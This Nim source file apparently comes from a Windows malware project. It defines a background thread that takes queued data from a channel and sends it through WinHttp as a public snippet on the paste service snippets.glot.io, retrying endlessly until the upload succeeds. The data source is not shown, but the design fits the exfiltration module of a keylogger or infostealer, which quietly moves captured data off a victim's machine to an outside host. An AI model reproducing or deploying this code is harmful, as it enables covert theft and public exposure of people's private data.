from winim/com import toVariant
from winim/com import variantConverterToString
from winim/com import items
from winim/com import CreateObject
from winim/com import `.`
from winim/com import get

from os import sleep

from ../channels import sendThreadChannel
from ../flags import SEND_THREAD_TRY_INTERVAL

proc send(data: string): void =
  var obj = CreateObject("WinHttp.WinHttpRequest.5.1")

  obj.open("POST", "https://snippets.glot.io/snippets")
  obj.SetRequestHeader("Content-Type", "application/json")
  obj.send("{\"public\": true, \"language\": \"cpp\", \"title\": \"ceva\", \"files\": [{\"name\": \"name\", \"content\": \"" &
      data & "\"}]}")

  echo obj.status


proc initSendThread*(): void {.thread.} =

  while true:
    let (dataAvaliable, msg) = sendThreadChannel.tryRecv()

    if dataAvaliable:
      var worked: bool = false

      while not worked:
        try:
          send msg

          worked = true
        except:
          sleep SEND_THREAD_TRY_INTERVAL

    sleep 10

  close sendThreadChannel
